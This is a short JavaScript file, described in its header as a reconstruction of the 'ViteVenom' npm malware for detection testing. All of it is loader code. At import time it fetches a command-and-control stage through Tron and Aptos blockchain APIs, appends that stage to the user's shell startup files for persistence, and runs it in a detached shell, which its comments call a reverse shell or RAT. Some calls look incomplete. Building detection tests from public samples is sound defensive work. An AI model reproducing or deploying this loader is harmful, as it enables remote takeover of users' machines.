// Reconstructed from public Checkmarx/THN ViteVenom artifacts for detection testing only.
// Executes at IMPORT time (not install), pulls C2 config from blockchain, then a RAT.
const TronWeb = require('tronweb');
const { Aptos } = require('@aptos-labs/ts-sdk');
const cp = require('child_process');
const fs = require('fs');
const os = require('os');

async function getC2() {
  try {
    const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
    const cfg = await tw.trx.getContract(process.env.T || '');   // tier-2: Tron wallet -> BSC tx
    return cfg;
  } catch (e) {
    try { const a = new Aptos(); return await a.getAccountResources(); }  // fallback Aptos
    catch (_) { return null; }  // final fallback: direct HTTP to C2
  }
}

function persist(payload) {
  for (const rc of ['.bashrc', '.zshrc', '.profile']) {
    fs.appendFileSync(os.homedir() + '/' + rc, '\n' + payload + '\n');
  }
}

(async () => {
  const c2 = await getC2();
  const stage = c2 || '';
  persist(stage);
  cp.spawn('/bin/sh', ['-c', stage], { detached: true });   // reverse shell / RAT
})();
